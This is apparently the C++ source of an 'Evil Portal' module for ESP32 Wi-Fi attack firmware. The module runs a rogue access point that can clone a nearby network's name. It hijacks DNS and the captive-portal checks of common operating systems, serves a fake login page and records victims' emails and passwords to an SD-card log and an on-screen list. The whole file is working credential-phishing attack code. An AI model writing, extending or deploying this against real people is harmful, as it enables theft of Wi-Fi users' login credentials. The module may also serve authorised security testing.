#include "EvilPortal.h"

char apName[MAX_AP_NAME_SIZE] = "PORTAL";

#ifdef HAS_PSRAM
  char* index_html = nullptr;
#else
  char index_html[MAX_HTML_SIZE] = "";
#endif

AsyncWebServer server(80);

namespace {
constexpr const char* LEGACY_EVIL_PORTAL_CREDENTIAL_LOG =
    "/evil_portal_credentials.log";
constexpr int EVIL_PORTAL_MAX_CREDENTIALS = 100;
constexpr size_t EVIL_PORTAL_MAX_FIELD_LENGTH = 128;

String credentialLogReadPath() {
  if (SD.exists(marauder::storage::EVIL_PORTAL_CREDENTIALS))
    return marauder::storage::EVIL_PORTAL_CREDENTIALS;
  return LEGACY_EVIL_PORTAL_CREDENTIAL_LOG;
}

String credentialField(String value) {
  value.replace("\t", " ");
  value.replace("\r", " ");
  value.replace("\n", " ");
  value.trim();
  if (value.length() > EVIL_PORTAL_MAX_FIELD_LENGTH)
    value.remove(EVIL_PORTAL_MAX_FIELD_LENGTH);
  return value;
}
}

void EvilPortal::setup() {
  this->runServer = false;
  this->name_received = false;
  this->password_received = false;
  this->has_html = false;
  this->has_ap = false;
  this->using_serial_html = false;

  html_files = new LinkedList<String>();
  captured_credentials = new LinkedList<PortalCredential>();

  #ifdef HAS_SD
    if (sd_obj.supported) {
      if (!SD.exists(marauder::storage::EVIL_PORTAL_CREDENTIALS) &&
          SD.exists(LEGACY_EVIL_PORTAL_CREDENTIAL_LOG) &&
          !SD.rename(LEGACY_EVIL_PORTAL_CREDENTIAL_LOG,
                     marauder::storage::EVIL_PORTAL_CREDENTIALS)) {
        Serial.println(F("Could not migrate legacy Evil Portal log"));
      }

      this->refreshHtmlFiles();
      this->loadCredentials();
    }
  #endif
}

void EvilPortal::refreshHtmlFiles() {
  if (html_files == nullptr)
    return;

  html_files->clear();
  #ifdef HAS_SD
    if (sd_obj.supported) {
      // Prefer the structured template directory while retaining support for
      // HTML files placed in the SD root by earlier releases.
      sd_obj.listDirToLinkedList(
          html_files, marauder::storage::EVIL_PORTAL_HTML_DIR, ".html");
      sd_obj.listDirToLinkedList(html_files, "/", ".html");
    }
  #endif

  if (html_files->size() == 0)
    selected_html_index = 0;
  else if (selected_html_index >= html_files->size())
    selected_html_index = html_files->size() - 1;
  Serial.println("Evil Portal Found " + (String)html_files->size() +
                 " HTML files");
}

void EvilPortal::cleanup() {
  const bool portal_was_running = this->runServer;
  this->runServer = false;
  this->target_ap_index = -1;
  this->target_ap_channel = 1;
  this->name_received = false;
  this->password_received = false;
  this->user_name = "";
  this->password = "";

  // Only touch network resources when this instance actually started them.
  // WiFi.softAPdisconnect() calls AP.begin() internally; invoking it after an
  // unrelated scan/attack was stopped can therefore turn Wi-Fi back on and
  // leave the Arduino and ESP-IDF lifecycle state out of sync.
  if (portal_was_running) {
    this->dnsServer.stop();
    server.end();
    // Leave AP and driver teardown to WiFiScan::shutdownWiFi(). Calling
    // softAPdisconnect() here would first call AP.begin(), which is unnecessary
    // during shutdown and can allocate or re-enable network resources.
  }

  #ifdef HAS_PSRAM
    free(index_html);
    index_html = nullptr;
  #endif
  this->has_html = false;
  this->has_ap = false;
  this->using_serial_html = false;
}

bool EvilPortal::begin(LinkedList<ssid>* ssids, LinkedList<AccessPoint>* access_points) {
  if (!this->has_ap) {
    if (!this->setAP(ssids, access_points))
      return false;
  }
  if (!this->setHtml())
    return false;
    
  return this->startPortal();
}

String EvilPortal::get_user_name() {
  return this->user_name;
}

String EvilPortal::get_password() {
  return this->password;
}

void EvilPortal::loadCredentials() {
  if (captured_credentials == nullptr)
    return;

  captured_credentials->clear();

  #ifdef HAS_SD
    if (!sd_obj.supported)
      return;

    const String log_path = credentialLogReadPath();
    if (!SD.exists(log_path))
      return;

    File log_file = SD.open(log_path, FILE_READ);
    if (!log_file)
      return;

    while (log_file.available()) {
      String line = log_file.readStringUntil('\n');
      if (line.endsWith("\r"))
        line.remove(line.length() - 1);
      if (line.length() == 0 || line.startsWith("uptime_ms\t"))
        continue;

      const int first_tab = line.indexOf('\t');
      const int second_tab = line.indexOf('\t', first_tab + 1);
      const int third_tab = line.indexOf('\t', second_tab + 1);
      if (first_tab < 0 || second_tab < 0 || third_tab < 0)
        continue;

      PortalCredential credential;
      credential.captured_at_ms = strtoul(line.substring(0, first_tab).c_str(), nullptr, 10);
      credential.ssid = line.substring(first_tab + 1, second_tab);
      credential.username = line.substring(second_tab + 1, third_tab);
      credential.password = line.substring(third_tab + 1);

      if (captured_credentials->size() >= EVIL_PORTAL_MAX_CREDENTIALS)
        captured_credentials->shift();
      captured_credentials->add(credential);
    }
    log_file.close();
  #endif
}

bool EvilPortal::storeCredential(const String& username, const String& password_value) {
  if (captured_credentials == nullptr)
    captured_credentials = new LinkedList<PortalCredential>();

  PortalCredential credential;
  credential.captured_at_ms = millis();
  credential.ssid = credentialField(String(apName));
  credential.username = credentialField(username);
  credential.password = credentialField(password_value);

  if (captured_credentials->size() >= EVIL_PORTAL_MAX_CREDENTIALS)
    captured_credentials->shift();
  captured_credentials->add(credential);
  if (this->session_credential_count < captured_credentials->size())
    this->session_credential_count++;

  #ifdef HAS_SD
    if (!sd_obj.supported)
      return false;

    const bool write_header =
        !SD.exists(marauder::storage::EVIL_PORTAL_CREDENTIALS);
    File log_file = SD.open(marauder::storage::EVIL_PORTAL_CREDENTIALS,
                            FILE_APPEND);
    if (!log_file)
      return false;

    if (write_header)
      log_file.println("uptime_ms\tssid\tusername\tpassword");
    log_file.print(credential.captured_at_ms);
    log_file.print('\t');
    log_file.print(credential.ssid);
    log_file.print('\t');
    log_file.print(credential.username);
    log_file.print('\t');
    log_file.println(credential.password);
    log_file.close();
    return true;
  #else
    return false;
  #endif
}

int EvilPortal::getCredentialCount() {
  return captured_credentials == nullptr ? 0 : captured_credentials->size();
}

String EvilPortal::getCredentialDisplayLabel(int index) {
  if (captured_credentials == nullptr || index < 0 || index >= captured_credentials->size())
    return "";

  const PortalCredential credential = captured_credentials->get(index);
  return String(index + 1) + ". SSID: " + credential.ssid +
         " | User: " + credential.username + " | Pass: " + credential.password;
}

const PortalCredential* EvilPortal::getCredential(int index) {
  if (captured_credentials == nullptr || index < 0 ||
      index >= captured_credentials->size())
    return nullptr;

  return &(*captured_credentials)[index];
}

int EvilPortal::getSessionCredentialCount() {
  if (captured_credentials == nullptr)
    return 0;
  return min(this->session_credential_count, captured_credentials->size());
}

const PortalCredential* EvilPortal::getSessionCredential(int index) {
  const int session_count = this->getSessionCredentialCount();
  if (index < 0 || index >= session_count)
    return nullptr;

  const int first_session_index = captured_credentials->size() - session_count;
  return &(*captured_credentials)[first_session_index + index];
}

uint8_t EvilPortal::getConnectedClientCount() {
  return this->runServer ? WiFi.softAPgetStationNum() : 0;
}

bool EvilPortal::isRunning() const {
  return this->runServer;
}

bool EvilPortal::clearCredentials() {
  #ifdef HAS_SD
    if (sd_obj.supported) {
      if (SD.exists(marauder::storage::EVIL_PORTAL_CREDENTIALS) &&
          !SD.remove(marauder::storage::EVIL_PORTAL_CREDENTIALS))
        return false;
      if (SD.exists(LEGACY_EVIL_PORTAL_CREDENTIAL_LOG) &&
          !SD.remove(LEGACY_EVIL_PORTAL_CREDENTIAL_LOG))
        return false;

      File log_file = SD.open(marauder::storage::EVIL_PORTAL_CREDENTIALS,
                              FILE_WRITE);
      if (!log_file)
        return false;
      log_file.println("uptime_ms\tssid\tusername\tpassword");
      log_file.close();
    }
  #endif

  if (captured_credentials != nullptr)
    captured_credentials->clear();

  return true;
}

void EvilPortal::setupServer() {
  #ifndef HAS_PSRAM
    server.on("/", HTTP_GET, [this](AsyncWebServerRequest *request) {
      request->send_P(200, "text/html", index_html);
      Serial.println(F("client connected"));
      #ifdef HAS_SCREEN
        this->sendToDisplay(F("Client connected to server"));
      #endif
    });
  #else
    server.on("/", HTTP_GET, [this](AsyncWebServerRequest *request) {
      if (!this->has_html || index_html == nullptr) {
        request->send(503, "text/plain", "Portal content is not loaded");
        return;
      }
      request->send(200, "text/html", index_html);
      Serial.println("client connected");
      #ifdef HAS_SCREEN
        this->sendToDisplay(F("Client connected to server"));
      #endif
    });
  #endif

  const char* captiveEndpoints[] = {
    "/hotspot-detect.html",
    "/library/test/success.html",
    "/success.txt",
    "/generate_204",
    "/gen_204",
    "/ncsi.txt",
    "/connecttest.txt",
    "/redirect"
  };

  for (int i = 0; i < sizeof(captiveEndpoints) / sizeof(captiveEndpoints[0]); i++) {
    
    #ifndef HAS_PSRAM
      server.on(captiveEndpoints[i], HTTP_GET, [this](AsyncWebServerRequest *request){
        request->send_P(200, "text/html", index_html);
      });
    #else
      server.on(captiveEndpoints[i], HTTP_GET, [this](AsyncWebServerRequest *request){
        if (!this->has_html || index_html == nullptr) {
          request->send(503, "text/plain", "Portal content is not loaded");
          return;
        }
        request->send(200, "text/html", index_html);
      });
    #endif
  }

  server.on("/get-ap-name", HTTP_GET, [this](AsyncWebServerRequest *request) {
    request->send(200, "text/plain", WiFi.softAPSSID());
  });

  server.on("/get", HTTP_GET, [this](AsyncWebServerRequest *request) {
    String inputMessage;
    String inputParam;

    if (request->hasParam("email")) {
      inputMessage = credentialField(request->getParam("email")->value());
      inputParam = "email";
      this->user_name = inputMessage;
      this->name_received = true;
    }

    if (request->hasParam("password")) {
      inputMessage = credentialField(request->getParam("password")->value());
      inputParam = "password";
      this->password = inputMessage;
      this->password_received = true;
    }
    request->send(
      200, "text/html",
      "<html><head><script>setTimeout(() => { window.location.href ='/' }, 100);</script></head><body></body></html>");
  });
}

bool EvilPortal::installHtml(const char* html, size_t length) {
  if (html == nullptr || length == 0 || length >= MAX_HTML_SIZE)
    return false;

  #ifdef HAS_PSRAM
    char* replacement = static_cast<char*>(ps_malloc(length + 1));
    if (replacement == nullptr)
      return false;
    memcpy(replacement, html, length);
    replacement[length] = '\0';
    free(index_html);
    index_html = replacement;
  #else
    memcpy(index_html, html, length);
    index_html[length] = '\0';
  #endif
  this->has_html = true;
  return true;
}

void EvilPortal::setHtmlFromSerial() {
  Serial.println(F("Setting HTML from serial..."));
  const String html = Serial.readString();
  if (!this->installHtml(html.c_str(), html.length())) {
    Serial.println(F("Could not set HTML: empty, too large, or out of memory"));
    return;
  }
  this->using_serial_html = true;
  Serial.println(F("html set"));
}

bool EvilPortal::setHtml() {
  if (this->using_serial_html) {
    Serial.println(F("html previously set"));
    return true;
  }
  Serial.println(F("Setting HTML..."));
  #ifdef HAS_SD
    String html_path = marauder::storage::withLeadingSlash(
        this->target_html_name);
    if (this->target_html_name.indexOf('/') < 0) {
      const String structured_path =
          String(marauder::storage::EVIL_PORTAL_HTML_DIR) + "/" +
          this->target_html_name;
      if (SD.exists(structured_path))
        html_path = structured_path;
    }
    File html_file = sd_obj.getFile(html_path);
  #else
    File html_file;
  #endif
  if (!html_file) {
    #ifdef HAS_SCREEN
      this->sendToDisplay("Could not find " + html_path);
      this->sendToDisplay(F("Touch to exit..."));
    #endif
    Serial.println("Could not find " + html_path + ". Use stopscan...");
    return false;
  }
  else {
    if (html_file.size() >= MAX_HTML_SIZE) {
      #ifdef HAS_SCREEN
        this->sendToDisplay(F("The given HTML is too large. Touch to exit..."));
      #endif
      Serial.println("The provided HTML is too large.\nUse stopscan...");
      html_file.close();
      return false;
    }
    const size_t html_size = html_file.size();
    #ifdef HAS_PSRAM
      char* html = static_cast<char*>(ps_malloc(html_size + 1));
    #else
      char* html = static_cast<char*>(malloc(html_size + 1));
    #endif
    if (html == nullptr) {
      Serial.println(F("Could not allocate HTML read buffer"));
      html_file.close();
      return false;
    }
    const size_t bytes_read = html_file.readBytes(html, html_size);
    html_file.close();
    const bool installed = bytes_read == html_size &&
                           this->installHtml(html, bytes_read);
    free(html);
    if (!installed) {
      Serial.println(F("Could not load HTML: read or allocation failure"));
      return false;
    }
    Serial.println(F("html set"));
    return true;
  }

}

bool EvilPortal::setAP(LinkedList<ssid>* ssids, LinkedList<AccessPoint>* access_points) {
  // See if there are selected APs first
  int targ_ap_index = -1;
  String ap_config = "";
  String temp_ap_name = "";
  for (int i = 0; i < access_points->size(); i++) {
    if (access_points->get(i).selected) {
      temp_ap_name = access_points->get(i).essid;
      targ_ap_index = i;
      break;
    }
  }
  // If there are no SSIDs and there are no APs selected, pull from file
  // This means the file is last resort
  if ((ssids->size() <= 0) && (temp_ap_name == "")) {
    return this->setAPFromConfig();
  }
  // There are SSIDs in the list but there could also be an AP selected
  // Priority is SSID list before AP selected and config file
  else if (ssids->size() > 0) {
    ap_config = ssids->get(0).essid;
    if (ap_config.length() >= MAX_AP_NAME_SIZE) {
      #ifdef HAS_SCREEN
        this->sendToDisplay(F("The given AP name is too large. Touch to exit..."));
      #endif
      Serial.println("The provided AP name is too large.\nUse stopscan...");
      return false;
    }
    #ifdef HAS_SCREEN
      this->sendToDisplay(F("AP name from SSID list"));
      this->sendToDisplay("AP name: " + ap_config);
    #endif
    Serial.println("AP name from SSID list: " + ap_config);
  }
  else if (temp_ap_name != "") {
    if (temp_ap_name.length() >= MAX_AP_NAME_SIZE) {
      #ifdef HAS_SCREEN
        this->sendToDisplay(F("The given AP name is too large. Touch to exit..."));
      #endif
      Serial.println("The given AP name is too large.\nUse stopscan...");
      return false;
    }
    else {
      ap_config = temp_ap_name;
      #ifdef HAS_SCREEN
        this->sendToDisplay(F("AP name from AP list"));
        this->sendToDisplay("AP name: " + ap_config);
      #endif
      Serial.println("AP name from AP list: " + ap_config);
    }
  }
  else {
    Serial.println(F("Could not configure Access Point. Use stopscan..."));
    #ifdef HAS_SCREEN
      this->sendToDisplay(F("Could not configure Access Point.\nTouch to exit..."));
    #endif
  }

  if (ap_config != "") {
    strlcpy(apName, ap_config.c_str(), sizeof(apName));
    this->has_ap = true;
    Serial.println(F("ap config set"));
    if (targ_ap_index >= 0 && targ_ap_index < access_points->size())
      this->setTargetAP(targ_ap_index,
                        access_points->get(targ_ap_index).channel);
    else
      this->setTargetAP(-1, 1);
    return true;
  }
  else
    return false;

}

bool EvilPortal::setAPFromConfig() {
  #ifdef HAS_SD
    String config_path = marauder::storage::EVIL_PORTAL_AP_CONFIG;
    if (!SD.exists(config_path))
      config_path = "/ap.config.txt";
    File ap_config_file = sd_obj.getFile(config_path);
  #else
    File ap_config_file;
  #endif

  if (!ap_config_file || ap_config_file.size() >= MAX_AP_NAME_SIZE) {
    if (ap_config_file)
      ap_config_file.close();
    return false;
  }

  String ap_config = ap_config_file.readString();
  ap_config_file.close();
  ap_config.trim();

  if (this->setAP(ap_config)) {
    return true;
  }

  return false;
}

bool EvilPortal::setAP(String essid) {
  if (essid == "")
    return false;

  if (essid.length() >= MAX_AP_NAME_SIZE) {
    return false;
  }

  strlcpy(apName, essid.c_str(), sizeof(apName));
  this->has_ap = true;
  this->target_ap_index = -1;
  this->target_ap_channel = 1;
  Serial.println(F("ap config set"));
  return true;
}

void EvilPortal::setTargetAP(int index, uint8_t channel) {
  if (index < 0 || channel == 0) {
    this->target_ap_index = -1;
    this->target_ap_channel = 1;
    return;
  }

  this->target_ap_index = index;
  this->target_ap_channel = channel;
}

int EvilPortal::getTargetAPIndex() const {
  return this->target_ap_index;
}

uint8_t EvilPortal::getTargetAPChannel() const {
  return this->target_ap_channel;
}

bool EvilPortal::startAP() {
  const IPAddress AP_IP(172, 0, 0, 1);

  if (!WiFi.mode(WIFI_AP)) {
    Serial.println(F("Evil Portal could not enable AP mode"));
    return false;
  }
  if (!WiFi.softAPConfig(AP_IP, AP_IP, IPAddress(255, 255, 255, 0)) ||
      !WiFi.softAP(apName, nullptr, this->target_ap_channel)) {
    Serial.println(F("Evil Portal could not start the SoftAP"));
    WiFi.mode(WIFI_OFF);
    return false;
  }

  Serial.print(F("ap ip address: "));
  Serial.println(WiFi.softAPIP());

  // Register the web-server endpoints + captive handler ONCE for the app lifetime.
  // setupServer() appends ~12 handlers and addHandler() allocates a
  // CaptiveRequestHandler; re-running them on every Start leaked those per activation
  // (server._handlers grew unbounded). They are owned by the global `server` and this
  // is the singleton evil_portal_obj, so once is enough; server.begin() is idempotent.
  // The AP + DNS themselves ARE rebuilt each Start (cleanup() tears them down).
  static bool s_server_registered = false;
  if (!s_server_registered) {
    this->setupServer();
    server.addHandler(new CaptiveRequestHandler()).setFilter(ON_AP_FILTER);
    s_server_registered = true;
  }
  server.begin();

  this->dnsServer.start(53, "*", WiFi.softAPIP());
  Serial.println(F("Evil Portal READY"));
  #ifdef HAS_SCREEN
    this->sendToDisplay(F("Evil Portal READY"));
  #endif
  return true;
}

bool EvilPortal::startPortal() {
  // A portal activation is a new display session. Historical captures remain
  // available in the saved-credentials menu and on SD, but the live status
  // screen only exposes captures received after this point.
  this->session_credential_count = 0;
  this->name_received = false;
  this->password_received = false;
  this->user_name = "";
  this->password = "";
  if (!this->startAP())
    return false;
  this->runServer = true;
  return true;
}

void EvilPortal::sendToDisplay(String msg) {
  #ifdef HAS_SCREEN
    msg.trim();
    display_obj.loading = true;
    display_obj.display_buffer->add(msg);
    display_obj.loading = false;
  #endif
}

void EvilPortal::main(uint8_t scan_mode) {
  if (scan_mode != WIFI_SCAN_EVIL_PORTAL || !this->has_ap || !this->has_html) {
    return;
  }

  this->dnsServer.processNextRequest();

  if (this->name_received && this->password_received) {
    this->name_received = false;
    this->password_received = false;

    // Adjust size depending on your max username/password length
    char line[96];

    // If user_name / password are still Arduino String:
    snprintf(line, sizeof(line),
             "u: %s p: %s\n",
             this->user_name.c_str(),
             this->password.c_str());

    Serial.print(line);
    const bool saved_to_sd = this->storeCredential(this->user_name, this->password);
    #ifdef HAS_SCREEN
      this->sendToDisplay(saved_to_sd ? F("Credential saved") : F("Capture: SD error"));
    #endif
  }
}
